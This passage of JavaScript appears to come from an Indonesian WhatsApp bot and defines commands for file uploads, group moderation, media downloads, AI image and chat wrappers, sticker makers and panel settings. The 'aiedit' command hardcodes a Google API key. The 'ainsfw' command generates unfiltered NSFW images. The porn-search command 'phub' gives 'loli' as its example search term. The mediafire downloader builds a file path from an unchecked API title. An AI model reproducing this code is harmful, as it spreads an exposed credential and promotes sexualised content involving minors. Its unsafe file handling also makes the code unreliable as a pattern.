 `*• Ukuran:* ${sizeKb} KB\n` +
 `*• Tipe:* ${mime}\n` +
 `*• Link:* ${url}`;

 const buttonMsg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({ text: caption }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 name: 'cta_copy',
 buttonParamsJson: JSON.stringify({
 display_text: 'Salin Link',
 copy_code: url
 })
 }
 ]
 })
 })
 }
 }
 }, { userJid: m.sender, quoted: m });

 await bani.relayMessage(m.chat, buttonMsg.message, { messageId: buttonMsg.key.id });

 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat upload ke Catbox!");
 }
}
break


case "uploadhtml": {
 try {
 if (!m.quoted || !m.quoted.message) {
 return bani.sendMessage(m.chat, { text: "Balas file HTML-nya bro!" }, { quoted: m });
 }

 const mime = m.quoted.message?.documentMessage?.mimetype || m.quoted.message?.document?.mimetype;
 if (!mime || !mime.includes("html")) {
 return bani.sendMessage(m.chat, { text: "File yang dibalas harus .html bro!" }, { quoted: m });
 }

 const buffer = await downloadMediaMessage(
 m.quoted,
 "buffer",
 {},
 { reuploadRequest: bani.updateMediaMessage }
 );

 const fs = require("fs");
 const { exec } = require("child_process");
 const filePath = `./tmp_upload_${Date.now()}.html`;

 fs.writeFileSync(filePath, buffer);

 exec(`curl --data-binary @${filePath} https://tmpweb.net`, async (err, stdout, stderr) => {
 fs.unlinkSync(filePath);
 if (err || !stdout) {
 return bani.sendMessage(m.chat, { text: "Gagal upload ke tmpweb.net bro!" }, { quoted: m });
 }

 const url = stdout.trim();
 bani.sendMessage(m.chat, { text: `Sukses bro!\nLink HTML-nya:\n${url}` }, { quoted: m });
 });

 } catch (e) {
 bani.sendMessage(m.chat, { text: `Error upload bro: ${e.message}` }, { quoted: m });
 }
}
break


case 'setppgroup': 
			case 'setppgrup': 
			case 'setppgc': {
				if (!isGroup) return m.reply(mess.group)
				if (!isAdmins) return m.reply(mess.admin)
				if (!isBotAdmins) return m.reply(mess.botAdmin)
				if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
				let media = await bani.downloadAndSaveMediaMessage(quoted)
				await bani.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
				m.reply(mess.succes)
			}
			break











case 'buatcase':
case 'generatecase':
case 'casegen': {
 if (!text) return m.reply(`Contoh:\n${prefix + command} .ping\n${prefix + command} .gimage dengan hasil URL dan tombol`);

 m.reply('waitt boss');
 try {
 const logic = `Kamu adalah AI pembuat fitur bot WhatsApp menggunakan struktur switch-case CommonJS. Buatlah 1 blok kode fitur berdasarkan perintah user, user bisa memberikan api, results apinya, maupun scrape dan atau fitur dari kamu, dan buatkan fitur sesuai api dan results nya maupun scrape atau fitur dari kamu. Jangan berikan tanda kutip,atau teks penjelas apapun. Hanya kode siap tempel ke dalam file bot. Gunakan metode if atau switch-case, sertakan fetch jika dibutuhkan, serta tampilkan response WhatsApp seperti conn.sendMessage atau reply sesuai konteks.`;

 const url = `https://api.nekorinn.my.id/ai/qwen-turbo-logic?text=${encodeURIComponent(text)}&logic=${encodeURIComponent(logic)}`;
 const res = await fetch(url);
 const json = await res.json();

 if (!json.status || !json.result) return m.reply('❌ Gagal membuat kode case dari API.');

 let rawCode = json.result.trim();
 rawCode = rawCode.replace(/^```[a-z]*\n?|```$/gi, '').trim();

 // Simpan ke file
 const tmpDir = path.join(__dirname, 'tmp');
 if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir);

 const fileName = `case-${Date.now()}.js`;
 const filePath = path.join(tmpDir, fileName);

 fs.writeFileSync(filePath, rawCode);

 await bani.sendMessage(m.chat, {
 document: fs.readFileSync(filePath),
 fileName,
 mimetype: 'application/javascript',
 caption: `✅ Case Berhasil Dibuat\n\nCommand: *${text}*`,
 }, { quoted: m });

 // Optional: hapus file
 // fs.unlinkSync(filePath);

 } catch (err) {
 console.error(err);
 m.reply('❌ Terjadi kesalahan saat generate case.');
 }
}
 break





;


case "usir": case "kik": {
if (!m.isGroup) return m.reply(mess.group)
if (!isCreator && !m.isAdmin) return m.reply(mess.admin)
if (!m.isBotAdmin) return m.reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await bani.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await bani.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply("example: @tag/reply")
}
}
break


case "updomain-v2":{
 if (!isCreator) return bani.sendMessage(m.chat, { text: '*[ System Notice ]* Khusus Owner Dan Pengguna Premium' });
 
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text;
 global.domainV2 = newteks;
 await bani.sendMessage(m.chat, { text: "_Berhasil Mengganti global.domain Panel✅_" }, { quoted: m });
 } else {
 await bani.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <global.domain>` }, { quoted: m });
 }
}
break

case "upapikey-v2": {
 if (!isCreator) return bani.sendMessage(m.chat, { text: '*[ System Notice ]* Khusus Owner Dan Pengguna Premium' });
 
 if (!text && !m.quoted) return bani.sendMessage(m.chat, { text: `*Format Salah!*\nContoh: ${prefix + command} <Apikey>` });
 
 const newteks = m.quoted ? m.quoted.text : text;
 if (newteks) {
 global.apikeyV2 = newteks;
 return bani.sendMessage(m.chat, { text: "_Berhasil Mengganti Apikey Panel✅_" });
 } else {
 return bani.sendMessage(m.chat, { text: `*Format Salah!*\nContoh: ${prefix + command} <Apikey>` });
 }
}
break

case "upcapikey-v2": {
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text;
 if (!isCreator) return onlyOwn();
 global.capikeyV2 = `${text}`;
 bani.sendMessage(m.chat, { text: "_Berhasil Mengganti Capikey Panel✅_" });
 } else {
 bani.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Capikey>` });
 }
}
break





case 'topcmd': {
 let logs = JSON.parse(fs.readFileSync(logPath))
 let todayStart = moment().startOf('day').valueOf()
 let todayLogs = logs.filter(log => log.time >= todayStart)
 let freq = {}
 for (let log of todayLogs) {
 freq[log.cmd] = (freq[log.cmd] || 0) + 1
 }
 let sorted = Object.entries(freq).sort((a, b) => b[1] - a[1])
 if (!sorted.length) return m.reply('Belum ada command yang digunakan hari ini.')
 let teks = '*Top 5 Command Hari Ini:*\n\n'
 sorted.slice(0, 5).forEach(([cmd, total], i) => {
 teks += `${i + 1}. *${cmd}* → ${total}x\n`
 })
 m.reply(teks)
}
break








case 'totalchat':
case 'statgroup': {
 const stats = getTodayStats(m.chat)
 if (Object.keys(stats).length === 0) return m.reply('Belum ada data chat hari ini.')
 let teks = `*Statistik Chat Hari Ini (${m.isGroup ? "Grup" : "Pribadi"}):*\n\n`
 const sorted = Object.entries(stats).sort((a, b) => b[1] - a[1])
 let i = 1
 for (const [user, total] of sorted) {
 const name = bani.getName ? await bani.getName(user) : user.split('@')[0]
 teks += `${i++}. ${name} - ${total} chat\n`
 }
 m.reply(teks)
}
break





case "gitclone": {
if (!text) return m.reply("example: https://github.com/Skyzodev/Simplebot")
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
 let [, user, repo] = args[0].match(regex) || []
 repo = repo.replace(/.git$/, '')
 let url = `https://api.github.com/repos/${user}/${repo}/zipball`
 let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
 bani.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! repositori tidak ditemukan`)
}}
break


case 'fb': case 'facebook': case 'fbdl':
case 'ig': case 'instagram': case 'igdl': {
 if (!args[0]) return m.reply("🔗 Masukkan URL Facebook atau Instagram!");
 try {
 const axios = require('axios');
 const cheerio = require('cheerio');
 async function yt5sIo(url) {
 try {
 const form = new URLSearchParams();
 form.append("q", url);
 form.append("vt", "home");
 const { data } = await axios.post('https://yt5s.io/api/ajaxSearch', form, {
 headers: {
 "Accept": "application/json",
 "X-Requested-With": "XMLHttpRequest",
 "Content-Type": "application/x-www-form-urlencoded",
 },
 });
 if (data.status !== "ok") throw new Error("Gagal mengambil data.");
 const $ = cheerio.load(data.data); 
 if (/^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(url)) {
 const thumb = $('img').attr("src");
 let links = [];
 $('table tbody tr').each((_, el) => {
 const quality = $(el).find('.video-quality').text().trim();
 const link = $(el).find('a.download-link-fb').attr("href");
 if (quality && link) links.push({ quality, link });
 });
 if (links.length > 0) {
 return { platform: "facebook", type: "video", thumb, media: links[0].link };
 } else if (thumb) {
 return { platform: "facebook", type: "image", media: thumb };
 } else {
 throw new Error("Tidak ada media yang dapat diunduh.");
 }
 } else if (/^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(url)) {
 const video = $('a[title="Download Video"]').attr("href");
 const image = $('img').attr("src");
 if (video) {
 return { platform: "instagram", type: "video", media: video };
 } else if (image) {
 return { platform: "instagram", type: "image", media: image };
 } else {
 throw new Error("Media tidak ditemukan.");
 }
 } else {
 throw new Error("URL tidak valid. Gunakan link Facebook atau Instagram.");
 }
 } catch (error) {
 return { error: error.message };
 }
 }
 await bani.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 let res = await yt5sIo(args[0]);
 if (res.error) {
 await bani.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 return m.reply(`⚠ *Error:* ${res.error}`);
 }
 if (res.type === "video") {
 await bani.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await bani.sendMessage(m.chat, { video: { url: res.media }, caption: "✅ *Berhasil mengunduh video!*" }, { quoted: m });
 } else if (res.type === "image") {
 await bani.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await bani.sendMessage(m.chat, { image: { url: res.media }, caption: "✅ *Berhasil mengunduh gambar!*" }, { quoted: m });
 }
 } catch (error) {
 console.error(error);
 await bani.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 m.reply("Terjadi kesalahan saat mengambil media.");
 }
}
break











case "ainsfw": {
 if (!text) return m.reply("Silakan masukkan prompt untuk menghasilkan gambar.");
 async function generateImage(prompt) {
 try {
 const url = `https://1yjs1yldj7.execute-api.us-east-1.amazonaws.com/default/ai_image?prompt=${encodeURIComponent(prompt)}&aspect_ratio=1:1&link=writecream.com`;
 const headers = {
 "User-Agent":
 "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
 "Referer": "https://www.writecream.com/ai-image-generator-free-no-sign-up/",
 };
const axios = require("axios");
 const response = await axios.get(url, { headers });
 if (response.data && response.data.image_link) {
 bani.sendMessage(m.chat, { image: { url: response.data.image_link }, caption: `Berikut gambar untuk: *${text}*` }, { quoted: m });
 } else {
 m.reply("Gagal mendapatkan gambar.");
 }
 } catch (error) {
 m.reply("Terjadi kesalahan saat mengambil gambar.");
 console.error(error);
 }
 }
 generateImage(text);
}
 break


case 'islamai': case 'aiislam': {
 if (!text) return m.reply("Masukkan pertanyaan yang ingin ditanyakan!");
 try {
 await bani.sendMessage(m.chat, {
 react: {
 text: "⏱️",
 key: m.key,
 }
 });
const axios = require("axios");
 let { data } = await axios.get(`https://bk9.fun/ai/Islam-ai?q=${encodeURIComponent(text)}`);
 if (!data.status || !data.BK9 || !data.BK9.result) {
 return m.reply("Gagal mendapatkan jawaban dari Islam AI.");
 }
 let caption = `🕌 *Islam AI Response*\n\n📜 *Pertanyaan:* ${text}\n\n📝 *Jawaban:*\n${data.BK9.result}`;
 await bani.sendMessage(m.chat, { text: caption }, { quoted: m });
 await bani.sendMessage(m.chat, {
 react: {
 text: "✅",
 key: m.key,
 }
 });
 } catch (error) {
 console.error(error);
 m.reply("Terjadi kesalahan saat menghubungi AI.");
 }
};
break


case 'aiedit': case 'editai': {
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || "";
 if (!text) {
 return m.reply("Harap masukkan prompt custom!\n\nContoh: aiedit buatkan foto itu lebih estetik.");
 }
 if (!mime) {
 return m.reply("Tidak ada gambar yang direply! Silakan reply gambar dengan format jpg/png.");
 }
 if (!/image\/(jpe?g|png)/.test(mime)) {
 return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png.`);
 }
 m.reply("Otw diedit sesuai permintaan...");
 try {
 let imgData = await q.download();
 let genAI = new GoogleGenerativeAI("AIzaSyB8T-3WnKqDbK3GSYYUtTiyDfIV-vBxoPw");
 const base64Image = imgData.toString("base64");
 const contents = [
 { text: text }, 
 {
 inlineData: {
 mimeType: mime,
 data: base64Image
 }
 }
 ];
 const model = genAI.getGenerativeModel({
 model: "gemini-2.0-flash-exp-image-generation",
 generationConfig: {
 responseModalities: ["Text", "Image"]
 },
 });
 const response = await model.generateContent(contents);
 let resultImage;
 let resultText = "";
 for (const part of response.response.candidates[0].content.parts) {
 if (part.text) {
 resultText += part.text;
 } else if (part.inlineData) {
 const imageData = part.inlineData.data;
 resultImage = Buffer.from(imageData, "base64");
 }
 }
 if (resultImage) {
 const tmpDir = path.join(process.cwd(), "tmp");
 if (!fs.existsSync(tmpDir)) {
 fs.mkdirSync(tmpDir, { recursive: true });
 }
 let tempPath = path.join(tmpDir, `gemini_${Date.now()}.png`);
 fs.writeFileSync(tempPath, resultImage);
 await bani.sendMessage(m.chat, { 
 image: { url: tempPath },
 caption: `*Edit selesai sesuai permintaan!*`
 }, { quoted: m });
 setTimeout(() => {
 try {
 fs.unlinkSync(tempPath);
 } catch (err) {
 console.error("Gagal menghapus file sementara:", err);
 }
 }, 30000);
 } else {
 m.reply("Gagal memproses gambar.");
 }
 } catch (error) {
 console.error(error);
 m.reply(`Error: ${error.message}`);
 }
}
break


case "brat": {
 if (!text) return m.reply(`Contoh : ${prefix + command} Hai kak`);
 const safeText = typeof text === 'string' ? text : String(text || '');
 if (safeText.length > 100) return m.reply(`Karakter terbatas, max 100!`);
 try {
 await bani.sendMessage(m.chat, {
 text: `Yuk pilih tipe *brat* yang Kamu suka dari menu di bawah ini ya, kak!`,
 footer: '',
 buttons: [
 {
 buttonId: `${prefix}owner`,
 buttonText: { displayText: '☎️ Hubungi Owner' },
 type: 1
 },
 {
 buttonId: 'action',
 buttonText: { displayText: '🖼️ Pilih Tipe Brat' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Pilih Tipe Brat',
 sections: [
 {
 title: 'Tipe Gambar',
 rows: [
 { title: 'Gambar', description: 'Versi gambar biasa', id: `${prefix}bratgambar ${safeText}` },
 { title: 'Gambar V2', description: 'Versi gambar kedua', id: `${prefix}bratimg2 ${safeText}` },
 { title: 'Gambar V3', description: 'Versi gambar ketiga', id: `${prefix}bratimg3 ${safeText}` }
 ]
 },
 {
 title: 'Tipe Video',
 rows: [
 { title: 'Video', description: 'Versi video/sticker bergerak', id: `${prefix}bratvid ${safeText}` }
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 4,
 viewOnce: true,
 contextInfo: {
 isForwarded: false,
 mentionedJid: [m.sender]
 }
 }, { quoted: m });
 } catch (error) {
 console.error('Error in brat command:', error);
 m.reply('Terjadi kesalahan saat memproses perintah. Silakan coba lagi.');
 }
}
break

case "bratgambar": case "bratimg": {
if (!text) return m.reply(example('teksnya'))
const axios = require('axios');
let brat = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false&delay=500`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await bani.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break

case "bratgambar2": case "bratimg2": {
 if (!text) {
 const colorList = `
*Daftar Kode Warna Umum*

*Dasar:*
• Hitam: #000000
• Putih: #FFFFFF
• Merah: #FF0000
• Hijau: #00FF00
• Biru: #0000FF
• Kuning: #FFFF00
• Cyan: #00FFFF
• Magenta: #FF00FF

*Lainnya:*
• Abu: #808080
• Navy: #000080
• Orange: #FFA500
• Pink: #FFC0CB
• Emas: #FFD700

Format: 
*bratimg2 teks | fontColor | bgColor*
Contoh:
bratimg2 Halo World | #FF0000 | #FFFFFF
`.trim();
 return m.reply(colorList);
 }
 const axios = require('axios');
 const [teks, fontColor, bgColor] = text.split("|").map(v => v?.trim());
 const finalText = teks || 'Yubi 😗😗';
 const finalFontColor = fontColor || '#000000';
 const finalBgColor = bgColor || '#FFFFFF';
 const apiUrl = `https://fastrestapis.fasturl.cloud/maker/brat/advanced?text=${encodeURIComponent(finalText)}&font=Arial&fontSize=auto&fontPosition=justify&fontBlur=3&fontColor=${encodeURIComponent(finalFontColor)}&bgColor=${encodeURIComponent(finalBgColor)}`;

 try {
 let response = await axios.get(apiUrl, { responseType: "arraybuffer" });
 let buffer = response.data;
 await bani.sendAsSticker(m.chat, buffer, m, { packname: global.packname });
 } catch (err) {
 console.error("Error bratimg2:", err);
 m.reply('Gagal membuat sticker. Coba lagi nanti.');
 }
}
break

case 'bratimg3': case 'bratgambar3': {
 const axios = require('axios');
 if (!text) {
 return m.reply(`*Format:*\nbratimg3 teks|tema\n\n*Contoh:*\nbratimg3 Biyu|black\n\n*List tema yang tersedia:*\n- white \n- black\n- green\n- blue\n- strike`);
 }
 let [teks, tema] = text.split('|');
 teks = teks?.trim();
 tema = tema?.trim()?.toLowerCase();
 let temaValid = ['white', 'black', 'green', 'blue', 'strike'];
 if (!temaValid.includes(tema)) tema = 'white';
 if (!teks) {
 return m.reply(`*Format salah!*\nContoh: bratimg3 halo dunia|black\n\n*List tema:*\n- white \n- black\n- green\n- blue\n- strike`);
 }
 let url = `https://api.nekorinn.my.id/maker/brat?text=${encodeURIComponent(teks)}&theme=${tema}`;
 try {
 let response = await axios.get(url, { responseType: "arraybuffer" });
 let buffer = response.data;
 await bani.sendAsSticker(m.chat, buffer, m, { packname: global.packname });
 } catch (e) {
 console.error(e);
 m.reply('Gagal mengambil data dari API. Coba lagi nanti.');
 }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "bratvid":
case "bratvideo": {
 if (!text) return m.reply(example('teksnya'));
 try {
 const axios = require('axios');
 const { tmpdir } = require('os');
 const { join } = require('path');
 const fs = require('fs');
 const { spawn } = require('child_process');
 const videoUrl = `https://fastrestapis.fasturl.cloud/maker/brat/animated?text=${encodeURIComponent(text)}&mode=animated`;
 const res = await axios.get(videoUrl, { responseType: 'arraybuffer' });
 const tmpMp4 = join(tmpdir(), `brat-${Date.now()}.mp4`);
 const tmpWebp = join(tmpdir(), `brat-${Date.now()}.webp`);
 fs.writeFileSync(tmpMp4, res.data);
 await new Promise((resolve, reject) => {
 const ffmpeg = spawn('ffmpeg', [
 '-i', tmpMp4,
 '-vf', 'scale=512:512:force_original_aspect_ratio=decrease,fps=15',
 '-loop', '0',
 '-ss', '0',
 '-t', '6',
 '-an',
 '-vsync', '0',
 '-s', '512x512',
 '-f', 'webp',
 tmpWebp
 ]);
 ffmpeg.on('close', (code) => {
 if (code === 0) resolve();
 else reject(new Error('FFmpeg failed with code ' + code));
 });
 });
 const stickerBuffer = fs.readFileSync(tmpWebp);
 await bani.sendMessage(m.chat, {
 sticker: stickerBuffer,
 packname: global.packname,
 author: global.author,
 }, { quoted: m });
 fs.unlinkSync(tmpMp4);
 fs.unlinkSync(tmpWebp);
 } catch (err) {
 console.error("Error:", err);
 m.reply('Gagal bikin sticker animasi. Coba lagi nanti.');
 }
}
break


case 'cekstatistik':
{
 const fs = require('fs-extra');
 const os = require('os');
 const path = require('path');

 // === Path dan Storage File ===
 const userFile = path.join(__dirname, 'user_chat.json');
 const statsFile = path.join(__dirname, 'bot_stats.json');

 // === Inisialisasi jika belum ada ===
 if (!fs.existsSync(userFile)) fs.writeJsonSync(userFile, {});
 if (!fs.existsSync(statsFile)) fs.writeJsonSync(statsFile, {
 totalCommands: 0,
 totalMessages: 0,
 startTime: Date.now()
 });

 // === Load Data ===
 const users = fs.readJsonSync(userFile);
 const stats = fs.readJsonSync(statsFile);

 // === Hitung Statistik ===
 const totalUsers = Object.keys(users).length;
 const totalMessages = stats.totalMessages;
 const totalCommands = stats.totalCommands;

 // === Hitung Uptime ===
 const uptimeMs = Date.now() - stats.startTime;
 const uptime = new Date(uptimeMs).toISOString().substr(11, 8); // HH:MM:SS

 // === Kirim ke WhatsApp ===
 let teks = `📊 *STATISTIK BOT:*\n\n` +
 `👥 Total User: ${totalUsers}\n` +
 `📩 Total Pesan Masuk: ${totalMessages}\n` +
 `📦 Total Command Digunakan: ${totalCommands}\n` +
 `⏱️ Uptime Bot: ${uptime}`;

 bani.sendMessage(m.chat, { text: teks }, { quoted: m });
}
break


case 'cekuser':
{
 const fs = require('fs-extra');
 const path = require('path');

 const storagePath = path.join(__dirname, 'user_chat.json');
 if (!fs.existsSync(storagePath)) fs.writeJsonSync(storagePath, {});

 // Auto Simpan User Saat Chat
 let sender = m.key.participant || m.key.remoteJid;
 let users = fs.readJsonSync(storagePath);

 if (!users[sender]) {
 users[sender] = {
 id: sender,
 name: m.pushName || 'Tanpa Nama',
 firstSeen: new Date().toISOString()
 };
 fs.writeJsonSync(storagePath, users);
 }

 // Tampilkan Semua User
 let list = Object.values(users)
 .map((u, i) => `${i + 1}. ${u.name} (${u.id.replace(/@s\.whatsapp\.net$/, '')})`)
 .join('\n');

 let teks = `📊 *Daftar User yang Pernah Chat Bot:*\n\n${list || 'Belum ada user.'}`;
 bani.sendMessage(m.chat, { text: teks }, { quoted: m });
}
break





case 'antitagsw':
 if (!isGroup) return m.reply('Fitur ini hanya bisa dipakai di grup!')
 if (!m.isBotAdmin) return m.reply(mess.botAdmin)
 if (!db.data) db.data = {}
 if (!db.data.chats) db.data.chats = {}
 if (!db.data.chats[m.chat]) db.data.chats[m.chat] = {}
 if (!db.data.chats[m.chat].antitagsw) db.data.chats[m.chat].antitagsw = { status: false, count: {} }
 let type = (q || '').toLowerCase()
 if (type === 'on') {
 if (db.data.chats[m.chat].antitagsw.status) return m.reply('Anti tag semua sudah aktif.')
 db.data.chats[m.chat].antitagsw.status = true
 m.reply('Anti tag semua telah *diaktifkan*!')
 } else if (type === 'off') {
 if (!db.data.chats[m.chat].antitagsw.status) return m.reply('Anti tag semua sudah nonaktif.')
 db.data.chats[m.chat].antitagsw.status = false
 db.data.chats[m.chat].antitagsw.count = {} 
 m.reply('Anti tag semua telah *dinonaktifkan*!')
 } else {
 m.reply(`Penggunaan:\n${prefix}antitagsw on\n${prefix}antitagsw off`)
 }
 break





case 'mediafire': {
 const axios = require('axios');
 const fs = require('fs');
 const path = require('path');
 const { pipeline } = require('stream/promises');

 const args = m.text.split(' ').slice(1);
 const mediafireUrl = args[0];

 if (!mediafireUrl) {
 return m.reply(`Silakan masukkan URL Mediafire.\n\nContoh:\n${prefix}${command} https://www.mediafire.com/file/contoh.zip/file`);
 }

 const mediafireUrlRegex = /^(https?:\/\/)?(www\.)?mediafire\.com\/.+$/i;
 if (!mediafireUrlRegex.test(mediafireUrl)) {
 return m.reply('URL yang Anda masukkan sepertinya bukan URL Mediafire yang valid.');
 }

 await m.reply('Sedang memproses unduhan Mediafire, mohon tunggu sebentar...');

 const tempDirPath = path.join('__dirname/../tmp');
 
 if (!fs.existsSync(tempDirPath)) {
 fs.mkdirSync(tempDirPath, { recursive: true });
 }
 
 let filePath = '';

 try {
 const apiUrl = `https://api.kimkiro.my.id/download/mediafire?url=${encodeURIComponent(mediafireUrl)}`;
 const apiResponse = await axios.get(apiUrl);
 const data = apiResponse.data;

 if (!data.status || !data.result || !data.result.downloadLink) {
 return m.reply(`Gagal mendapatkan informasi file dari API. Pesan: ${data.message || 'Tidak ada data hasil.'}`);
 }

 const { title, size, type, downloadLink } = data.result;
 
 const fileName = title || `mediafire_file.${type || 'bin'}`;
 filePath = path.join(tempDirPath, fileName);

 const fileResponse = await axios({
 method: 'GET',
 url: downloadLink,
 responseType: 'stream'
 });

 const writer = fs.createWriteStream(filePath);
 await pipeline(fileResponse.data, writer);

 await bani.sendMessage(m.chat, {
 document: { url: filePath },
 mimetype: fileResponse.headers['content-type'] || 'application/octet-stream',
 fileName: title
 }, { quoted: m });

 } catch (error) {
 let errorMessage = 'Maaf, terjadi kesalahan saat mengunduh file Mediafire.';
 if (error.response) {
 errorMessage += ` Status API: ${error.response.status}. Pesan: ${error.response.data?.message || error.message}`;
 } else if (error.code === 'ECONNABORTED') {
 errorMessage = 'Waktu unduhan habis. Coba lagi nanti atau gunakan tautan yang lebih kecil.';
 } else {
 errorMessage += ` Pesan: ${error.message}`;
 }
 await m.reply(errorMessage);
 } finally {
 if (fs.existsSync(filePath)) {
 fs.unlinkSync(filePath);
 }
 }
}
break


















case 'setdomainV2': {
if (!isCreator) return m.reply(mess.owner)
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text;
 global.domainV2 = newteks;
 try {
 const fs = require('fs');
 const path = './settings.js'; 
 let content = fs.readFileSync(path, 'utf8');
 const domainRegex = /(global\.domain\s*=\s*['"`])([^'"`]*?)(['"`])/;
 content = content.replace(domainRegex, `$1${newteks}$3`);
 fs.writeFileSync(path, content);
 await bani.sendMessage(m.chat, { text: "_Berhasil Mengganti DomainV2 Panel✅_" }, { quoted: m });
 } catch (error) {
 console.error('Error updating settings.js:', error);
 await bani.sendMessage(m.chat, { text: "_Gagal menyimpan perubahan ke file settings.js_" }, { quoted: m });
 }
 } else {
 await bani.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Domain>` }, { quoted: m });
 }
}
break

case 'setapiV2': {
if (!isCreator) return m.reply(mess.owner)
 if (!text && !m.quoted) return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);
 const newteks = m.quoted ? m.quoted.text : text;
 if (newteks) {
 global.apikeyV2 = newteks;
 try {
 const fs = require('fs');
 const path = './settings.js'; 
 let content = fs.readFileSync(path, 'utf8');
 const apikeyRegex = /(global\.apikey\s*=\s*['"`])([^'"`]*?)(['"`])/;
 content = content.replace(apikeyRegex, `$1${newteks}$3`);
 fs.writeFileSync(path, content);
 await bani.sendMessage(m.chat, { text: "_Berhasil Mengganti ApikeyV2 Panel✅_" }, { quoted: m });
 } catch (error) {
 console.error('Error updating settings.js:', error);
 await bani.sendMessage(m.chat, { text: "_Gagal menyimpan perubahan ke file settings.js_" }, { quoted: m });
 }
 } else {
 return m.reply(`*Format Salah!*\nContoh: ${prefix + command} <Apikey>`);
 }
}
break

case 'setcapiV2': {
if (!isCreator) return m.reply(mess.owner)
 if (text || m.quoted) {
 const newteks = m.quoted ? m.quoted.text : text; 
 global.capikeyV2 = newteks;
 try {
 const fs = require('fs');
 const path = './settings.js'; 
 let content = fs.readFileSync(path, 'utf8');
 const capikeyRegex = /(global\.capikey\s*=\s*['"`])([^'"`]*?)(['"`])/;
 content = content.replace(capikeyRegex, `$1${newteks}$3`);
 fs.writeFileSync(path, content);
 await bani.sendMessage(m.chat, { text: "_Berhasil Mengganti Capikey-V2 Panel✅_" }, { quoted: m });
 } catch (error) {
 console.error('Error updating settings.js:', error);
 await bani.sendMessage(m.chat, { text: "_Gagal menyimpan perubahan ke file settings.js_" }, { quoted: m });
 }
 } else {
 await bani.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <Capikey>` }, { quoted: m });
 }
}
break


case 'phub':
case 'phsearch': {
 if (!text) return m.reply(`📌 Kirim kata kunci pencarian!
Contoh: ${prefix + command} loli`);

 try {
 const res = await fetch(`https://api.fasturl.link/sfwnsfw/pornhub/search?name=${encodeURIComponent(text)}`);
 const json = await res.json();

 if (!json.result || json.result.length === 0) return m.reply('❌ Tidak ditemukan hasil.');

 const selected = json.result.slice(0, 10);
 const cards = await Promise.all(selected.map(async (v, i) => ({
 header: {
 title: `🔞 ${v.title}`,
 hasMediaAttachment: true,
 imageMessage: (await generateWAMessageContent({ image: { url: v.preview } }, { upload: bani.waUploadToServer })).imageMessage
 },
 body: {
 text: `📺 Durasi: ${v.duration}
👁️ Views: ${v.views}`
 },
 footer: {
 text: `🌐 Klik tombol untuk download langsung`
 },
 nativeFlowMessage: {
 buttons: [
 {
 name: 'cta_url',
 buttonParamsJson: JSON.stringify({
 display_text: '⬇️ Download Video',
 url: v.url
 })
 },
 {
 name: 'quick_reply',
 buttonParamsJson: JSON.stringify({
 display_text: '📥 Kirim Video',
 id: `.xpdl ${v.url}`
 })
 }
 ]
 }
 })));

 const carousel = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: { text: `🔍 Hasil pencarian dari: *${text}*` },
 footer: { text: `Geser untuk melihat lebih banyak...` },
 carouselMessage: { cards }
 })
 }
 }
 }, { quoted: m });

